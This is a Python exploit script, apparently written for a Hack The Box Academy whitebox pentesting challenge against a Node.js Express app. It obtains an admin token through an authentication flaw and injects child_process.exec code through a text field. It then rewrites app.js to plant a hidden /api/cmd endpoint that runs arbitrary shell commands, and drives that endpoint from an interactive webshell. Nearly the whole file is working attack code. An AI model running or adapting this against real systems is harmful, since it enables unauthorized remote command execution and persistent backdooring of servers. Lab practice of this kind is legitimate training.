# this is an script developed to solve a chanllenge of the whitebox pentesting module from the Hack The Box Academy
# it is a simple webshell that uses the LFI vulnerability to execute commands on the server
# the server is a nodejs server that uses express to handle the requests
# the server has a LFI vulnerability that allows us to read the app.js file
# we can inject code into the app.js file to create a new endpoint that will execute commands on the server
# the server will execute the commands as the user that is authenticade, in this case the user is "admin" 
# since we obtained the token for the admin user exploiting a vulnerability in the server authentication mechanism

import requests
import json
from os import system

proxy = {
    "http": "http://127.0.0.1:8080"    
}

base = "http://83.136.253.61:56358"
headers = { "Content-Type": "application/json",}

# get the token for the user "admin" 
def get_token():
    url = f"{base}/api/auth/authenticate"
    data = {"email": "k4my@hackthebox.com"}
    resp = requests.post(url, headers=headers, data=json.dumps(data), proxies=proxy)
    token = resp.json()["token"]
    return token

# exploit the LFI vulnerability to inject code into the app.js file
def LFI(token, payload):
    url = f"{base}/api/service/generate"
    headers["Authorization"] = f"Bearer {token}"
    data = {"text": "'})+ require('child_process').exec(`"+payload+"`, (error, stdout, stderr) => { console.log(stdout.trim()); });//"}
    resp = requests.post(url, headers=headers, data=json.dumps(data), proxies=proxy)
    return resp.json()

# simple webshell to execute commands on the server after injecting the code into the app.js file
def comands():
    print("\n-------------------------------\n")
    print("|\tSimple Webshell\t   |\n")
    print("type 'exit' to exit XD\n")
    print("-------------------------------\n")
    cmd = input("#: ")
    
    while(cmd):
        if(cmd=="exit"):
            break
        elif(cmd=="clear"):
            system("clear")
        else:
            url = f"{base}/api/cmd?cmd={cmd}"
            resp = requests.get(url, proxies=proxy)
            print(f"{resp.text}\n")
        cmd = input("#: ")
    
    print("Bye\n")    

if __name__ == "__main__":
    token = get_token()
    # payload to inject code into the app.js file
    payload = [
        'head -n 16 ./src/app.js > ./src/app2.js', 
        'echo \'app.get(\"/api/cmd\", (req, res) => {const cmd = require(\"child_process\").execSync(req.query.cmd).toString();res.send(cmd);});\' >> ./src/app2.js', 
        'tail -n +17 ./src/app.js >> ./src/app2.js',
        'mv ./src/app2.js ./src/app.js'       
    ]
    try:
        for command in payload:
            print(f"Resposta do servidor: {LFI(token, command)}\n")
    except Exception as e:
        print(f"Erro: {e}")
    
    comands()


    